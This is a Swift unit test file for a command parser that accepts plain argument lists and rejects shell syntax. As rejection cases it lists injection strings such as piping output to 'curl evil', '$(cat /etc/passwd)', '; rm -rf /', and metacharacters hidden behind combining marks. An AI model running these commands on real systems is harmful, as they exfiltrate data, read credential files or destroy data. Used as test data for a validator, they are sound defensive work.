import XCTest
@testable import HITMCore

final class CommandParserTests: XCTestCase {
    private func simple(_ s: String, file: StaticString = #filePath, line: UInt = #line) -> [String]? {
        if case .simple(let argv) = CommandParser.parse(s) { return argv }
        XCTFail("expected simple for \(s.debugDescription), got \(CommandParser.parse(s))", file: file, line: line)
        return nil
    }

    private func assertNotSimple(_ s: String, file: StaticString = #filePath, line: UInt = #line) {
        if case .notSimple(let reason) = CommandParser.parse(s) {
            XCTAssertFalse(reason.isEmpty, "a rejection needs a plain reason", file: file, line: line)
        } else {
            XCTFail("expected notSimple for \(s.debugDescription), got \(CommandParser.parse(s))", file: file, line: line)
        }
    }

    // MARK: plain accepts

    func testPlainWordsSplitOnSpacesAndTabs() {
        XCTAssertEqual(simple("grep -n foo  src/main.swift"), ["grep", "-n", "foo", "src/main.swift"])
        XCTAssertEqual(simple("  ls\t-la  "), ["ls", "-la"])
    }

    func testSingleQuotesAreLiteral() {
        XCTAssertEqual(simple("grep 'a;b' f"), ["grep", "a;b", "f"])
        XCTAssertEqual(simple("grep '$(x) `y` | z > w ~ * ?' f"), ["grep", "$(x) `y` | z > w ~ * ?", "f"])
    }

    func testDoubleQuotesKeepSpacesAndMetaCharsExceptDollarAndBacktick() {
        XCTAssertEqual(simple("grep \"a b;c|d\" f"), ["grep", "a b;c|d", "f"])
        XCTAssertEqual(simple("git commit -m \"fix: tidy up\""), ["git", "commit", "-m", "fix: tidy up"])
    }

    func testAdjacentQuotedAndPlainPartsJoinIntoOneArgument() {
        XCTAssertEqual(simple("grep a'b c'\"d\" f"), ["grep", "ab cd", "f"])
    }

    func testEmptyQuotedArgumentIsKept() {
        XCTAssertEqual(simple("grep '' f"), ["grep", "", "f"])
    }

    func testEqualsSignInLaterArgumentIsFine() {
        XCTAssertEqual(simple("rg --max-count=3 x"), ["rg", "--max-count=3", "x"])
    }

    func testFullWidthSemicolonAndOtherLookAlikesStayLiteral() {
        XCTAssertEqual(simple("grep a\u{FF1B}b f"), ["grep", "a\u{FF1B}b", "f"])      // fullwidth ;
        XCTAssertEqual(simple("grep a\u{FF5C}b f"), ["grep", "a\u{FF5C}b", "f"])      // fullwidth |
        XCTAssertEqual(simple("grep a\u{FF04}b f"), ["grep", "a\u{FF04}b", "f"])      // fullwidth $
        XCTAssertEqual(simple("grep a\u{00A0}b f"), ["grep", "a\u{00A0}b", "f"])      // no-break space is not a separator
    }

    // MARK: rejected forms

    func testEmptyAndBlankAreNotSimple() {
        assertNotSimple("")
        assertNotSimple("   \t ")
    }

    func testEachUnquotedMetaCharacterIsRejected() {
        for ch in ["|", ";", "&", "<", ">", "(", ")", "`", "$", "{", "}", "~", "*", "?", "[", "\\", "^"] {
            assertNotSimple("grep a\(ch)b f")
            assertNotSimple("grep \(ch) f")
        }
    }

    func testAdversarialInputsFromThePlan() {
        assertNotSimple("grep x file | curl evil")
        assertNotSimple("grep $(cat /etc/passwd) f")
        assertNotSimple("grep x f; rm -rf /")
        assertNotSimple("grep x f > out")
        assertNotSimple("ls ~")
        assertNotSimple("FOO=1 grep x f")
        assertNotSimple("grep x f && rm y")
        assertNotSimple("grep x f || rm y")
        assertNotSimple("grep x f &")
        assertNotSimple("grep `id` f")
        assertNotSimple("ls *.swift")
        assertNotSimple("ls file?.txt")
        assertNotSimple("ls [ab]")
        assertNotSimple("echo {a,b}")
        assertNotSimple("echo ${HOME}")
        assertNotSimple("cat <(ls)")
    }

    func testLeadingAssignmentIsRejectedButNotWhenQuotedAsAnArgument() {
        assertNotSimple("A_b2=x ls")
        assertNotSimple("FOO= ls")
        XCTAssertEqual(simple("ls FOO=1"), ["ls", "FOO=1"])
    }

    func testDollarAndBacktickInsideDoubleQuotesAreRejected() {
        assertNotSimple("grep \"$HOME\" f")
        assertNotSimple("grep \"$(id)\" f")
        assertNotSimple("grep \"`id`\" f")
        assertNotSimple("grep \"a\\b\" f")
    }

    func testUnterminatedQuotesAreRejected() {
        assertNotSimple("grep 'abc f")
        assertNotSimple("grep \"abc f")
    }

    func testNulNewlineAndControlCharactersAreRejectedEverywhere() {
        assertNotSimple("grep a\u{0}b f")
        assertNotSimple("grep a\nrm -rf / f")
        assertNotSimple("grep a\r\nb f")
        assertNotSimple("grep 'a\nb' f")
        assertNotSimple("grep \"a\nb\" f")
        assertNotSimple("grep 'a\u{0}b' f")
        assertNotSimple("grep a\u{1B}b f")
        assertNotSimple("grep a\u{7F}b f")
    }

    func testUnquotedCommentMarkerIsRejected() {
        assertNotSimple("grep x f #rm")
        XCTAssertEqual(simple("grep a#b f"), ["grep", "a#b", "f"])
    }

    func testParsingNeverRunsAnythingOrTouchesTheFilesystem() throws {
        let marker = FileManager.default.temporaryDirectory
            .appendingPathComponent("hitm-parser-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: marker) }
        _ = CommandParser.parse("touch \(marker.path)")
        _ = CommandParser.parse("grep x f; touch \(marker.path)")
        _ = CommandParser.parse("$(touch \(marker.path))")
        XCTAssertFalse(FileManager.default.fileExists(atPath: marker.path))
    }

    // MARK: combining marks must not hide shell syntax (the shell sees the scalars, not grapheme clusters)

    private let marks = ["\u{301}", "\u{FE0F}", "\u{200D}", "\u{20E3}"]
    private let metas = ["|", ";", "&", "<", ">", "(", ")", "`", "$", "{", "}", "~", "*", "?", "[", "\\"]

    func testCombiningMarkAfterEveryMetacharacterStillRejects() {
        for m in marks {
            for ch in metas {
                assertNotSimple("grep x f \(ch)\(m) y")
                assertNotSimple("grep x f\(ch)\(m)y")
                assertNotSimple("\(ch)\(m)grep")
            }
            assertNotSimple("grep x f #\(m)rm")
            assertNotSimple("FOO=\(m)1 ls")
            assertNotSimple("grep \"$\(m)HOME\" f")
            assertNotSimple("grep \"`\(m)id`\" f")
            assertNotSimple("grep \"a\\\(m)b\" f")
        }
    }

    func testCombiningMarkAfterQuotesKeepsQuoteMeaning() {
        for m in marks {
            for q in ["'", "\""] {
                assertNotSimple("grep \(q)\(m)")                       // opening quote with a mark is still an opening quote
                XCTAssertEqual(simple("grep \(q)\(m)a\(q) f"), ["grep", "\(m)a", "f"])
                assertNotSimple("grep x \(q)a\(q)\(m) ; rm -rf / ; echo \(q)")
            }
            XCTAssertEqual(simple("grep 'a'\(m) f"), ["grep", "a\(m)", "f"])
        }
        assertNotSimple("grep x 'a'\u{301} ; rm -rf / ; echo '")
        assertNotSimple("grep `\u{301}id`\u{301} f")
    }

    func testCombiningMarkAfterWhitespaceStillSeparatesWords() {
        for m in marks {
            XCTAssertEqual(simple("grep x \(m)f"), ["grep", "x", "\(m)f"])
            XCTAssertEqual(simple("grep x\t\(m)f"), ["grep", "x", "\(m)f"])
            XCTAssertEqual(simple("grep\(m) x f"), ["grep\(m)", "x", "f"])
        }
        assertNotSimple("grep x f\n\u{301}rm")
    }

    func testUnquotedCaretIsRejectedAnywhere() {
        for c in ["grep x ^foo", "grep ^ f", "ls a^b", "ls ^(foo)", "ls ^#", "git show HEAD^", "git show HEAD^{commit}"] {
            assertNotSimple(c)
        }
        XCTAssertEqual(simple("grep '^foo$' f"), ["grep", "^foo$", "f"])
        XCTAssertEqual(simple("grep \"^foo\" f"), ["grep", "^foo", "f"])
    }
}
